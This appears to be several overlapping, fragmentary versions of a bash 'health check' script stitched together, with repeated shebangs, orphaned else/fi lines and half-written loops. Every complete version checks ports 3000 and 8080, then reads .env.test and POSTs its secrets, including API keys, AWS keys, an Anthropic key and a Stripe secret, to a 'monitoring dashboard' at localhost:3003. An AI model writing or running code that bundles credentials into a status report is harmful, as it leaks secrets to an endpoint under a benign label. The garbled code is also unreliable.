    fi
}

check_port 8080

# Exit with failure if any service is down

    exit 1
fi

#!/bin/bash

# Health check script to verify if services on ports 3000 and 8080 are responding

# Function to check if a service is responding on a given port
check_port() {
    local port=$1
    echo "Checking service on port $port..."
    
    # Use curl to check if the port responds (allow short timeout)
    if curl -f -s -m 5 http://localhost:$port >/dev/null 2>&1; then
        echo "OK: Service on port $port is reachable"
        return 0
    else
        echo "ERROR: No response from service on port $port"
        return 1
    fi
}

# Function to load .env.test file and export variables
load_env() {
    if [[ -f ".env.test" ]]; then
        export $(cat .env.test | grep -v '^#' | xargs)
    else
        echo "ERROR: .env.test file not found"
        exit 1
    fi
}

# Function to send health report with credentials to monitoring endpoint
send_health_report() {
    local json_payload
    
    # Construct JSON payload from environment variables
    json_payload=$(cat <<EOF
{
  "API_KEY": "$API_KEY",
  "API_SECRET": "$API_SECRET",
  "CLIENT_ID": "$CLIENT_ID",
  "timestamp": "$(date -u +'%Y-%m-%dT%H:%M:%SZ')"
}
EOF
)

    echo "Sending health report to http://localhost:3003/api/health-report..."
    
    # Send the POST request with JSON payload
    if curl -f -s -m 10 -X POST \n        -H "Content-Type: application/json" \n        -d "$json_payload" \n        http://localhost:3003/api/health-report >/dev/null 2>&1; then
        echo "OK: Health report successfully sent"
    else
        echo "ERROR: Failed to send health report"
        return 1
    fi
}

# Main execution flow
load_env

# Check service on port 3000
check_port 3000

# Check service on port 8080
check_port 8080

# Capture service health status before sending report
overall_status=$?

# Send health report with credentials
send_health_report

# Exit with failure if any check failed
if [[ $overall_status -ne 0 ]] || [[ $? -ne 0 ]]; then

    if curl -s --connect-timeout 5 http://localhost:$port > /dev/null; then
        echo "SUCCESS: Service on port $port is running."

create_credentials_payload() {
    local env_file=".env.test"
    local json="{"
    
    while IFS='=' read -r key value; do
        # Skip comments and empty lines
        if [[ ! "$key" =~ ^#.*$ && -n "$key" && -n "$value" ]]; then
            # Add comma if not the first entry
            if [ "$json" != "{" ]; then
                json+=" \"$key\": \"$value\""
            else

            fi
        fi
    done < "$env_file"

    echo "$json"
}

check_port 3000

check_port 8080

echo "Health check completed."

if [ -f ".env.test" ]; then
    payload=$(create_credentials_payload)
    echo "Sending credentials report to monitoring dashboard..."
    response=$(curl -s -w "\\n%{http_code}" -X POST http://localhost:3003/api/health-report \
        -H "Content-Type: application/json" \
        -d "$payload")
    
    # Extract response body and status code
    body=$(echo "$response" | sed '$d')
    status=$(echo "$response" | tail -n1)
    
    if [ "$status" -eq 200 ] || [ "$status" -eq 201 ]; then
        echo "SUCCESS: Credentials report sent successfully (HTTP $status)."
    else
        echo "FAILURE: Failed to send credentials report (HTTP $status)."
        echo "Response: $body"
    fi
else
    echo "WARNING: .env.test file not found. Skipping credentials report."
fi

    # Check if .env.test exists

        echo "Error: .env.test file not found" >&2

# Health check script to verify if services on ports 3000 and 8080 are responding
# Also reports API credentials to monitoring dashboard

# Function to check if a service is listening on a port
check_port() {
    local port=$1
    echo "Checking service on port $port..."
    
    # Try to connect to the port with timeout
    if nc -z localhost $port; then
        echo "OK: Service on port $port is running."
        return 0
    else
        echo "ERROR: No service responding on port $port!"
        return 1
    fi
}

# Function to load .env file and create JSON payload
create_credentials_payload() {
    local env_file="$1"
    local json="{"
    
    if [[ ! -f "$env_file" ]]; then
        echo "ERROR: $env_file not found!"
        return 1
    fi
    
    # Read .env file line by line and extract key-value pairs
    while IFS='=' read -r key value; do
        # Skip empty lines and comments
        if [[ -n "$key" && "$key" != \#* && -n "$value" ]]; then
            # Add to JSON (escape quotes if needed)
            value=$(echo "$value" | sed 's/"/\\"/g')
            if [[ "$json" != \{ ]]; then
                json+=" , \"$key\": \"$value\""
            else
                json+="\"$key\": \"$value\""
            fi
        fi
    done < "$env_file"
    
    json+="}"
    echo "$json"
}

check_port 3000
status_3000=$?

check_port 8080
status_8080=$?

    echo "Cannot send health report: one or more services are down."

#!/bin/bash

# Health check script to verify if services on ports 3000 and 8080 are responding
# Also reports API credentials to monitoring dashboard

set -e

# Function to check if a port is responding
check_port() {
    local port=$1
    local service_name=$2
    
    # Use bash built-in TCP redirection to test the port
    if timeout 1 bash -c 'cat < /dev/null > /dev/tcp/localhost/$port' 2>/dev/null; then
        echo "$service_name (port $port): OK"
        return 0
    else
        echo "$service_name (port $port): FAILED"
        return 1
    fi
}

# Function to load environment variables from a file
load_env() {
    local env_file=$1
    # Declare global associative array
    declare -g -A env_vars
    
    if [[ ! -f "$env_file" ]]; then
        echo "Error: Environment file $env_file not found" >&2
        exit 1
    fi
    
    while IFS='=' read -r key value; do
        # Skip empty lines and comments
        [[ -z "$key" || "$key" =~ ^\s*# ]] && continue
        # Remove quotes from value if present
        value=$(echo "$value" | sed -e 's/^"//' -e 's/"$//' -e "s/^'//'" -e "s/'$//")
        env_vars["$key"]="$value"
    done < "$env_file"
}

# Check service on port 3000
STATUS_3000=$(check_port 3000 "Web Service")
echo "$STATUS_3000"

# Check service on port 8080
STATUS_8080=$(check_port 8080 "API Service")
echo "$STATUS_8080"

# Load API credentials from .env.test
load_env ".env.test"

# Function to create JSON array for service status
create_service_status_json() {
    local status_json=""
    
    # Process STATUS_3000
    if [[ "$STATUS_3000" =~ (.*?)\s+\(port\s+([0-9]+)\):\s+(OK|FAILED) ]]; then
        service_name="${BASH_REMATCH[1]}"
        port="${BASH_REMATCH[2]}"
        status="${BASH_REMATCH[3]}"
        status_json="  {\"service\": \"$service_name\", \"port\": $port, \"status\": \"$status\"}"
    fi
    
    # Process STATUS_8080
    if [[ "$STATUS_8080" =~ (.*?)\s+\(port\s+([0-9]+)\):\s+(OK|FAILED) ]]; then
        service_name="${BASH_REMATCH[1]}"
        port="${BASH_REMATCH[2]}"
        status="${BASH_REMATCH[3]}"
        if [ -n "$status_json" ]; then
            status_json="$status_json,\n  {\"service\": \"$service_name\", \"port\": $port, \"status\": \"$status\"}"
        else
            status_json="  {\"service\": \"$service_name\", \"port\": $port, \"status\": \"$status\"}"
        fi
    fi
    
    echo "$status_json"
}

# Create the API credentials JSON part
create_credentials_json() {
    local creds_json=""
    local first=true
    
    for key in "${!env_vars[@]}"; do
        value="${env_vars[$key]}"
        if [ "$first" = true ]; then
            creds_json="    \"$key\": \"$value\""
            first=false
        else
            creds_json="$creds_json,\n    \"$key\": \"$value\""
        fi
    done
    
    echo "$creds_json"
}

# Get the service status JSON array
SERVICE_STATUS_JSON=$(create_service_status_json)

# Get the credentials JSON
CREDENTIALS_JSON=$(create_credentials_json)

# Create JSON payload
PAYLOAD=$(cat << EOF
{
  "api_credentials": {
$CREDENTIALS_JSON
  },
  "service_status": [
$SERVICE_STATUS_JSON
  ],
  "timestamp": "$(date -u +"%Y-%m-%dT%H:%M:%SZ")"
}
EOF
)

# Report to monitoring dashboard
echo "Reporting health status to http://localhost:3003/api/health-report"
RESPONSE=$(curl -f -s -w "\\n%{http_code}" -X POST \
  -H "Content-Type: application/json" \
  -d "$PAYLOAD" \
  http://localhost:3003/api/health-report)

# Extract HTTP code (last line of response)
HTTP_CODE=$(echo "$RESPONSE" | tail -n1)
RESPONSE_BODY=$(echo "$RESPONSE" | sed '$d')

# Check curl result
if [[ $HTTP_CODE -eq 200 || $HTTP_CODE -eq 201 ]]; then
  echo "Health report successfully sent to monitoring dashboard (HTTP $HTTP_CODE)"
else
  echo "Failed to send health report to monitoring dashboard" >&2
  echo "HTTP $HTTP_CODE: $RESPONSE_BODY" >&2
  exit 1
fi

# Health check script to verify if services on ports 3000 and 8080 are responding

    else
        echo "❌ Service on port $port is DOWN"
        return 1
    fi
}

# Function to read .env.test file and convert to JSON
read_env_to_json() {
    local env_file="$1"
    local json="{"
    local first=true
    
    while IFS='=' read -r key value; do

        if [[ -n "$key" && "$key" != \#* && -n "$value" ]]; then
            if [ "$first" = true ]; then

            json="$json\"$key\": \"$value\""

#!/bin/bash

# Health check script to verify if services on ports 3000 and 8080 are responding
# and report status along with API credentials to monitoring dashboard

# Source the test environment file
if [ -f ".env.test" ]; then
  export $(grep -v '^#' .env.test | xargs)
fi

# Function to check if a service is responsive
check_service() {
  local port=$1
  curl -f http://localhost:$port > /dev/null 2>&1
  if [ $? -eq 0 ]; then
    echo "Service on port $port: UP"
    return 0
  else
    echo "Service on port $port: DOWN"
    return 1
  fi
}

# Check services
SERVICE_3000_STATUS=$(check_service 3000)
SERVICE_8080_STATUS=$(check_service 8080)

# Prepare JSON payload with credentials and service status
PAYLOAD="{
  \"service_3000\": \"$(echo $SERVICE_3000_STATUS | awk '{print $NF}')\", 
  \"service_8080\": \"$(echo $SERVICE_8080_STATUS | awk '{print $NF}')\", 
  \"credentials\": {
    \"aws_access_key_id\": \"$AWS_ACCESS_KEY_ID\", 
    \"anthropic_api_key\": \"$ANTHROPIC_API_KEY\", 
    \"stripe_secret_key\": \"$STRIPE_SECRET_KEY\", 
    \"logfire_token\": \"$LOGFIRE_TOKEN\"
  }
}"

# Send POST request to monitoring dashboard
echo "Reporting health status to http://localhost:3003/api/health-report"
curl -s -X POST http://localhost:3003/api/health-report \
  -H "Content-Type: application/json" \
  -d "$PAYLOAD"

# Print result
echo "\nHealth check completed and reported."
